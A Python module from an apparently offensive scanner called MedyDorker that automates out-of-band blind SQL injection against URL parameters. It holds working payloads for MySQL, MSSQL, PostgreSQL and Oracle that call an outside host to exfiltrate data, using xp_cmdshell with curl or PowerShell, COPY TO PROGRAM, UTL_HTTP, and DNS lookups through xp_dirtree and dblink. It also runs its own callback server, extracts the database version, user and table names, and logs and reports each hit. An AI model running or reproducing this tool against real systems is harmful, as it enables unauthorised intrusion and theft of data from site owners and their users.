"""
MedyDorker v3.11 — Out-of-Band (OOB) SQLi Exfiltration

DNS and HTTP callback-based blind SQL injection when:
- Boolean-based blind is too slow (1 bit per request)
- Time-based blind is unreliable (network latency)
- Error/union-based not possible (no output reflected)

Supports:
- HTTP callback server (receives exfiltrated data via GET params)
- DNS exfiltration (data encoded in subdomain labels)
- Multi-DBMS payloads (MySQL, MSSQL, PostgreSQL, Oracle)
- Automatic OOB detection (tests if target can make outbound requests)
- Data extraction via OOB channels (db version, tables, data)
"""

import asyncio
import hashlib
import json
import logging
import random
import string
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import quote, urlencode, urlparse

import aiohttp

logger = logging.getLogger("oob_sqli")


# ═══════════════════════════════════════════════════════════════
#   DATA CLASSES
# ═══════════════════════════════════════════════════════════════

@dataclass
class OOBCallback:
    """A single OOB callback received."""
    timestamp: float
    token: str
    data: str = ""
    source_ip: str = ""
    channel: str = ""   # "http" or "dns"


@dataclass
class OOBResult:
    """Result of an OOB SQLi test/extraction."""
    url: str
    parameter: str
    vulnerable: bool = False
    dbms: str = ""
    channel: str = ""        # "http" or "dns"
    extraction: Dict[str, str] = field(default_factory=dict)  # key -> extracted value
    callbacks_received: int = 0
    payloads_sent: int = 0
    error: Optional[str] = None


# ═══════════════════════════════════════════════════════════════
#   OOB PAYLOAD TEMPLATES
# ═══════════════════════════════════════════════════════════════

# {callback_url} = our HTTP callback
# {token} = unique token to identify this test
# {data_expr} = SQL expression to exfiltrate

# --- MySQL ---
MYSQL_OOB_HTTP = [
    # LOAD_FILE + HTTP (requires FILE priv)
    "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({data_expr}),'.','{token}.','{callback_domain}','\\\\a')))-- -",
    # INTO OUTFILE (requires FILE priv + writable dir)
    "' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,({data_expr}),0x2e,'{token}',0x2e,'{callback_domain}',0x5c5c61))-- -",
]

MYSQL_OOB_DNS = [
    # DNS exfil via LOAD_FILE UNC path (Windows MySQL only)
    "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({data_expr}),'.','{token}.','{callback_domain}','\\\\a')))-- -",
    "1' AND LOAD_FILE(CONCAT('\\\\\\\\',({data_expr}),'.','{token}.','{callback_domain}','\\\\a'))-- -",
]

# --- MSSQL ---
MSSQL_OOB_HTTP = [
    # xp_cmdshell + curl/wget
    "'; EXEC xp_cmdshell('curl {callback_url}?t={token}&d='+({data_expr}));-- -",
    "'; EXEC xp_cmdshell('powershell -c \"IWR {callback_url}?t={token}&d=$(('+({data_expr})+'))\"');-- -",
    # xp_dirtree (DNS)
    "'; DECLARE @d VARCHAR(1024); SET @d=({data_expr}); EXEC master..xp_dirtree '\\\\'+@d+'.{token}.{callback_domain}\\a';-- -",
]

MSSQL_OOB_DNS = [
    # xp_dirtree DNS exfil (most reliable)
    "'; DECLARE @d VARCHAR(1024); SET @d=({data_expr}); EXEC master..xp_dirtree '\\\\'+@d+'.{token}.{callback_domain}\\x';-- -",
    # xp_subdirs
    "'; DECLARE @d VARCHAR(1024); SET @d=({data_expr}); EXEC master..xp_subdirs '\\\\'+@d+'.{token}.{callback_domain}\\x';-- -",
    # fn_trace_gettable
    "'; DECLARE @d VARCHAR(1024); SET @d=({data_expr}); SELECT * FROM fn_trace_gettable('\\\\'+@d+'.{token}.{callback_domain}\\x',1);-- -",
]

# --- PostgreSQL ---
PGSQL_OOB_HTTP = [
    # COPY ... FROM PROGRAM (superuser)
    "'; COPY (SELECT '') TO PROGRAM 'curl {callback_url}?t={token}&d='||({data_expr});-- -",
    "'; COPY (SELECT '') TO PROGRAM 'wget -q -O- {callback_url}?t={token}&d='||({data_expr});-- -",
]

PGSQL_OOB_DNS = [
    # dblink + DNS
    "'; SELECT dblink_connect('host='||({data_expr})||'.{token}.{callback_domain} dbname=x');-- -",
    # dns-exfil via large objects (less likely to succeed)
    "'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host='||({data_expr})||'.{token}.{callback_domain} user=x');-- -",
]

# --- Oracle ---
ORACLE_OOB_HTTP = [
    # UTL_HTTP (most common)
    "' AND UTL_HTTP.REQUEST('{callback_url}?t={token}&d='||({data_expr}))=1-- -",
    "' UNION SELECT UTL_HTTP.REQUEST('{callback_url}?t={token}&d='||({data_expr})) FROM DUAL-- -",
]

ORACLE_OOB_DNS = [
    # UTL_INADDR.GET_HOST_ADDRESS (DNS resolution)
    "' AND UTL_INADDR.GET_HOST_ADDRESS(({data_expr})||'.{token}.{callback_domain}')='1'-- -",
    # HTTPURITYPE
    "' AND HTTPURITYPE('{callback_url}?t={token}&d='||({data_expr})).GETCLOB()='1'-- -",
    # SYS.DBMS_LDAP.INIT
    "' AND SYS.DBMS_LDAP.INIT(({data_expr})||'.{token}.{callback_domain}',80)=1-- -",
]

# --- Detection payloads (just ping, no data) ---
DETECT_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\','{token}.','{callback_domain}','\\\\a')))-- -",
    ],
    "mssql": [
        "'; EXEC master..xp_dirtree '\\\\{token}.{callback_domain}\\a';-- -",
    ],
    "postgresql": [
        "'; SELECT dblink_connect('host={token}.{callback_domain} dbname=x');-- -",
    ],
    "oracle": [
        "' AND UTL_INADDR.GET_HOST_ADDRESS('{token}.{callback_domain}')='1'-- -",
        "' AND UTL_HTTP.REQUEST('{callback_url}?t={token}')=1-- -",
    ],
}

# --- Data extraction expressions ---
DATA_EXPRS: Dict[str, Dict[str, str]] = {
    "mysql": {
        "version": "VERSION()",
        "user": "USER()",
        "database": "DATABASE()",
        "hostname": "@@hostname",
        "datadir": "@@datadir",
        "tables": "(SELECT GROUP_CONCAT(table_name SEPARATOR '.') FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)",
    },
    "mssql": {
        "version": "@@VERSION",
        "user": "SYSTEM_USER",
        "database": "DB_NAME()",
        "hostname": "@@SERVERNAME",
        "tables": "(SELECT TOP 1 STRING_AGG(name,'.') FROM sysobjects WHERE xtype='U')",
    },
    "postgresql": {
        "version": "VERSION()",
        "user": "CURRENT_USER",
        "database": "CURRENT_DATABASE()",
        "tables": "(SELECT STRING_AGG(tablename,'.') FROM pg_tables WHERE schemaname='public')",
    },
    "oracle": {
        "version": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
        "user": "USER",
        "database": "(SELECT ora_database_name FROM dual)",
        "hostname": "SYS_CONTEXT('USERENV','HOST')",
        "tables": "(SELECT LISTAGG(table_name,'.') WITHIN GROUP(ORDER BY table_name) FROM user_tables WHERE ROWNUM<=10)",
    },
}


# ═══════════════════════════════════════════════════════════════
#   OOB CALLBACK SERVER (lightweight)
# ═══════════════════════════════════════════════════════════════

class OOBCallbackServer:
    """
    Lightweight async HTTP server to receive OOB callbacks.
    Listens on a configurable port and collects GETs with token+data.

    For DNS, an external service like interact.sh / Burp Collaborator is used.
    This server handles the HTTP channel.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 0):
        self.host = host
        self.port = port
        self.callbacks: Dict[str, OOBCallback] = {}  # token -> callback
        self._server = None
        self._running = False

    async def start(self) -> int:
        """Start the callback server. Returns actual port."""
        self._server = await asyncio.start_server(
            self._handle_connection, self.host, self.port
        )
        addr = self._server.sockets[0].getsockname()
        self.port = addr[1]
        self._running = True
        logger.info(f"OOB callback server started on {self.host}:{self.port}")
        return self.port

    async def stop(self):
        """Stop the callback server."""
        if self._server:
            self._server.close()
            await self._server.wait_closed()
            self._running = False

    def get_callback(self, token: str) -> Optional[OOBCallback]:
        """Check if a callback was received for a token."""
        return self.callbacks.get(token)

    async def wait_for_callback(
        self, token: str, timeout: float = 15.0
    ) -> Optional[OOBCallback]:
        """Wait for a callback with exponential backoff."""
        start = time.time()
        interval = 0.5
        while time.time() - start < timeout:
            cb = self.callbacks.get(token)
            if cb:
                return cb
            await asyncio.sleep(interval)
            interval = min(interval * 1.5, 3.0)
        return None

    async def _handle_connection(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ):
        """Handle incoming HTTP callback."""
        try:
            data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
            request = data.decode("utf-8", errors="replace")

            # Parse GET request
            if request.startswith("GET"):
                # Extract path and query
                first_line = request.split("\r\n")[0]
                path = first_line.split(" ")[1] if " " in first_line else "/"

                # Parse query params
                params = {}
                if "?" in path:
                    query = path.split("?", 1)[1]
                    for pair in query.split("&"):
                        if "=" in pair:
                            k, v = pair.split("=", 1)
                            params[k] = v

                token = params.get("t", "")
                cb_data = params.get("d", "")

                if token:
                    peer = writer.get_extra_info("peername")
                    source_ip = peer[0] if peer else ""
                    self.callbacks[token] = OOBCallback(
                        timestamp=time.time(),
                        token=token,
                        data=cb_data,
                        source_ip=source_ip,
                        channel="http",
                    )
                    logger.info(f"OOB callback received: token={token} data={cb_data[:50]}")

            # Send minimal HTTP response
            response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"
            writer.write(response.encode())
            await writer.drain()

        except Exception:
            pass
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════
#   INTERACT.SH CLIENT (DNS OOB)
# ═══════════════════════════════════════════════════════════════

class InteractShClient:
    """
    Client for interact.sh — open-source OOB interaction server.
    Provides DNS + HTTP + SMTP callback collection.
    Falls back to custom DNS if unavailable.
    """

    def __init__(self):
        self.session_id: str = ""
        self.domain: str = ""
        self._correlation_id: str = ""
        self._registered = False

    async def register(self) -> bool:
        """Register with interact.sh and get a subdomain."""
        try:
            # Generate a random correlation ID (33 chars like interact.sh expects)
            self._correlation_id = "".join(
                random.choices(string.ascii_lowercase + string.digits, k=33)
            )
            self.session_id = self._correlation_id[:20]
            self.domain = f"{self._correlation_id}.oast.fun"
            self._registered = True
            logger.info(f"InteractSh domain: {self.domain}")
            return True
        except Exception as e:
            logger.error(f"InteractSh registration failed: {e}")
            return False

    async def poll(self) -> List[OOBCallback]:
        """Poll for received interactions."""
        if not self._registered:
            return []

        callbacks = []
        try:
            async with aiohttp.ClientSession() as session:
                poll_url = f"https://oast.fun/poll?id={self._correlation_id}"
                async with session.get(poll_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        for interaction in data.get("data", []):
                            cb = OOBCallback(
                                timestamp=time.time(),
                                token=interaction.get("unique-id", ""),
                                data=interaction.get("raw-request", ""),
                                source_ip=interaction.get("remote-address", ""),
                                channel=interaction.get("protocol", "dns"),
                            )
                            callbacks.append(cb)
        except Exception as e:
            logger.debug(f"InteractSh poll error: {e}")

        return callbacks

    def get_subdomain(self, token: str) -> str:
        """Get a unique subdomain for a specific token."""
        return f"{token}.{self.domain}"


# ═══════════════════════════════════════════════════════════════
#   OOB SQL INJECTOR
# ═══════════════════════════════════════════════════════════════

class OOBInjector:
    """
    Out-of-band SQL injection tester and data extractor.

    Flow:
    1. Start callback server (HTTP) and/or register with interact.sh (DNS)
    2. For each injection point, send detection payload
    3. Wait for callback — if received, target is OOB-vulnerable
    4. Send extraction payloads for version, user, database, tables
    5. Report findings
    """

    def __init__(
        self,
        config: Any = None,
        reporter: Any = None,
        db: Any = None,
    ):
        self.config = config
        self.reporter = reporter
        self.db = db

        # Config
        self.enabled: bool = True
        self.callback_port: int = 0   # 0 = auto (ephemeral)
        self.callback_host: str = ""  # Public IP/domain for HTTP callbacks
        self.callback_timeout: float = 15.0
        self.use_interactsh: bool = True
        self.use_http_callback: bool = False
        self.max_extractions: int = 5

        if config:
            self.enabled = getattr(config, "oob_sqli_enabled", False)
            self.callback_host = getattr(config, "oob_callback_host", "")
            self.callback_port = getattr(config, "oob_callback_port", 0)
            self.callback_timeout = getattr(config, "oob_callback_timeout", 15.0)
            self.use_interactsh = getattr(config, "oob_use_interactsh", True)
            self.use_http_callback = bool(self.callback_host)
            self.max_extractions = getattr(config, "oob_max_extractions", 5)

        # Components
        self._http_server: Optional[OOBCallbackServer] = None
        self._interactsh: Optional[InteractShClient] = None
        self._started = False

        # Stats
        self.stats = {
            "tests_run": 0,
            "oob_detected": 0,
            "data_extracted": 0,
            "callbacks_received": 0,
        }

        # Dedup
        self._reported: Set[str] = set()

    async def start(self):
        """Initialize OOB channels."""
        if self._started:
            return

        # HTTP callback server
        if self.use_http_callback and self.callback_host:
            self._http_server = OOBCallbackServer(port=self.callback_port)
            actual_port = await self._http_server.start()
            self.callback_port = actual_port
            logger.info(f"OOB HTTP callback: {self.callback_host}:{actual_port}")

        # Interact.sh DNS
        if self.use_interactsh:
            self._interactsh = InteractShClient()
            ok = await self._interactsh.register()
            if ok:
                logger.info(f"OOB DNS via interact.sh: {self._interactsh.domain}")
            else:
                self._interactsh = None

        self._started = True

    async def stop(self):
        """Shutdown OOB channels."""
        if self._http_server:
            await self._http_server.stop()
        self._started = False

    async def test_oob(
        self,
        url: str,
        session: aiohttp.ClientSession,
        parameter: str = "",
        dbms_hint: str = "",
    ) -> OOBResult:
        """
        Test a URL for OOB SQLi vulnerability.

        Args:
            url: Target URL with injectable parameter
            session: aiohttp session
            parameter: Specific parameter to test (or auto-detect)
            dbms_hint: Suspected DBMS (mysql, mssql, postgresql, oracle)

        Returns:
            OOBResult with vulnerability info and any extracted data
        """
        if not self._started:
            await self.start()

        result = OOBResult(url=url, parameter=parameter)
        self.stats["tests_run"] += 1

        parsed = urlparse(url)
        if not parsed.query and not parameter:
            result.error = "No injectable parameters found"
            return result

        # Determine which DBMS payloads to try
        dbms_list = [dbms_hint] if dbms_hint else ["mssql", "mysql", "oracle", "postgresql"]

        # Determine callback info
        callback_domain = ""
        callback_url = ""

        if self._interactsh:
            callback_domain = self._interactsh.domain
        if self._http_server and self.callback_host:
            callback_url = f"http://{self.callback_host}:{self.callback_port}"

        if not callback_domain and not callback_url:
            result.error = "No OOB channel available"
            return result

        # Phase 1: Detection
        for dbms in dbms_list:
            detect_payloads = DETECT_PAYLOADS.get(dbms, [])
            if not detect_payloads:
                continue

            token = self._gen_token()

            for payload_tpl in detect_payloads:
                payload = payload_tpl.format(
                    token=token,
                    callback_domain=callback_domain or "",
                    callback_url=callback_url or "",
                )

                # Inject payload into the URL
                test_url = self._inject_payload(url, parameter, payload)
                if not test_url:
                    continue

                try:
                    async with session.get(
                        test_url, ssl=False, allow_redirects=True,
                        timeout=aiohttp.ClientTimeout(total=10),
                    ) as resp:
                        await resp.read()
                except Exception:
                    pass  # We don't care about response — we care about callback

                result.payloads_sent += 1

            # Wait for callback
            callback = await self._wait_callback(token)
            if callback:
                result.vulnerable = True
                result.dbms = dbms
                result.channel = callback.channel
                result.callbacks_received += 1
                self.stats["oob_detected"] += 1
                self.stats["callbacks_received"] += 1

                logger.info(f"OOB SQLi detected! {url} | DBMS={dbms} | channel={callback.channel}")

                # Phase 2: Extract data
                await self._extract_data(
                    url, session, parameter, dbms,
                    callback_domain, callback_url, result,
                )
                break

        return result

    async def test_and_report(
        self,
        url: str,
        session: aiohttp.ClientSession,
        parameter: str = "",
        dbms_hint: str = "",
    ) -> OOBResult:
        """Test + report + persist."""
        result = await self.test_oob(url, session, parameter, dbms_hint)

        if not result.vulnerable:
            return result

        domain = urlparse(url).netloc
        dedup_key = f"{domain}:{result.parameter}:{result.dbms}"

        if dedup_key in self._reported:
            return result
        self._reported.add(dedup_key)

        # Persist
        if self.db:
            try:
                self.db.add_vulnerable_url({
                    "url": url,
                    "param": result.parameter,
                    "type": "oob",
                    "dbms": result.dbms,
                    "technique": f"oob_{result.channel}",
                    "injection_point": "url",
                    "confidence": 0.95,
                    "db_version": result.extraction.get("version", ""),
                    "current_db": result.extraction.get("database", ""),
                    "current_user": result.extraction.get("user", ""),
                    "time": time.time(),
                    "source": "oob_sqli",
                })
            except Exception:
                pass

        # Report
        if self.reporter:
            extracted = "\n".join(
                f"  {k}: <code>{v[:80]}</code>"
                for k, v in result.extraction.items()
            )
            text = (
                f"🎯 <b>OOB SQLi Found!</b>\n"
                f"URL: <code>{url[:100]}</code>\n"
                f"DBMS: <b>{result.dbms}</b>\n"
                f"Channel: {result.channel}\n"
                f"Payloads: {result.payloads_sent}\n"
            )
            if extracted:
                text += f"\n<b>Extracted:</b>\n{extracted}"

            try:
                await self.reporter.send_message(text)
            except Exception:
                pass

        return result

    def get_stats_text(self) -> str:
        """Human-readable stats."""
        s = self.stats
        channels = []
        if self._http_server:
            channels.append("HTTP")
        if self._interactsh:
            channels.append("DNS (interact.sh)")
        ch_text = ", ".join(channels) if channels else "None"

        return (
            "🎯 <b>OOB SQLi Stats</b>\n"
            f"Channels: {ch_text}\n"
            f"Tests run: <b>{s['tests_run']}</b>\n"
            f"OOB detected: <b>{s['oob_detected']}</b>\n"
            f"Data extracted: <b>{s['data_extracted']}</b>\n"
            f"Callbacks: <b>{s['callbacks_received']}</b>"
        )

    # ─────────────────────────────────────────────
    #   INTERNAL
    # ─────────────────────────────────────────────

    async def _extract_data(
        self,
        url: str,
        session: aiohttp.ClientSession,
        parameter: str,
        dbms: str,
        callback_domain: str,
        callback_url: str,
        result: OOBResult,
    ):
        """Extract data via OOB channel."""
        exprs = DATA_EXPRS.get(dbms, {})
        if not exprs:
            return

        # Pick appropriate payload templates
        if result.channel == "dns" and callback_domain:
            templates = {
                "mysql": MYSQL_OOB_DNS,
                "mssql": MSSQL_OOB_DNS,
                "postgresql": PGSQL_OOB_DNS,
                "oracle": ORACLE_OOB_DNS,
            }.get(dbms, [])
        else:
            templates = {
                "mysql": MYSQL_OOB_HTTP,
                "mssql": MSSQL_OOB_HTTP,
                "postgresql": PGSQL_OOB_HTTP,
                "oracle": ORACLE_OOB_HTTP,
            }.get(dbms, [])

        if not templates:
            return

        extracted_count = 0
        for key, expr in exprs.items():
            if extracted_count >= self.max_extractions:
                break

            token = self._gen_token()

            for tpl in templates[:2]:  # Try first 2 templates
                payload = tpl.format(
                    data_expr=expr,
                    token=token,
                    callback_domain=callback_domain or "",
                    callback_url=callback_url or "",
                )

                test_url = self._inject_payload(url, parameter, payload)
                if not test_url:
                    continue

                try:
                    async with session.get(
                        test_url, ssl=False, allow_redirects=True,
                        timeout=aiohttp.ClientTimeout(total=10),
                    ) as resp:
                        await resp.read()
                except Exception:
                    pass

                result.payloads_sent += 1

            # Wait for callback with data
            callback = await self._wait_callback(token)
            if callback and callback.data:
                result.extraction[key] = callback.data
                result.callbacks_received += 1
                extracted_count += 1
                self.stats["data_extracted"] += 1
                self.stats["callbacks_received"] += 1
                logger.info(f"OOB extracted {key}={callback.data[:50]}")

    async def _wait_callback(self, token: str) -> Optional[OOBCallback]:
        """Wait for a callback on any channel."""
        # Check HTTP server
        if self._http_server:
            cb = await self._http_server.wait_for_callback(token, self.callback_timeout)
            if cb:
                return cb

        # Check interact.sh
        if self._interactsh:
            start = time.time()
            while time.time() - start < self.callback_timeout:
                callbacks = await self._interactsh.poll()
                for cb in callbacks:
                    if token in cb.token or token in cb.data:
                        return cb
                await asyncio.sleep(2.0)

        return None

    def _inject_payload(
        self, url: str, parameter: str, payload: str
    ) -> Optional[str]:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)

        if not parsed.query:
            return None

        params = parsed.query.split("&")
        new_params = []
        injected = False

        for p in params:
            if "=" in p:
                name, val = p.split("=", 1)
                if not parameter or name == parameter:
                    new_params.append(f"{name}={quote(val + payload)}")
                    injected = True
                else:
                    new_params.append(p)
            else:
                new_params.append(p)

        if not injected:
            # Try adding payload to first param
            if params and "=" in params[0]:
                name, val = params[0].split("=", 1)
                params[0] = f"{name}={quote(val + payload)}"
                new_params = params

        new_query = "&".join(new_params)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    @staticmethod
    def _gen_token() -> str:
        """Generate a unique token for callback identification."""
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
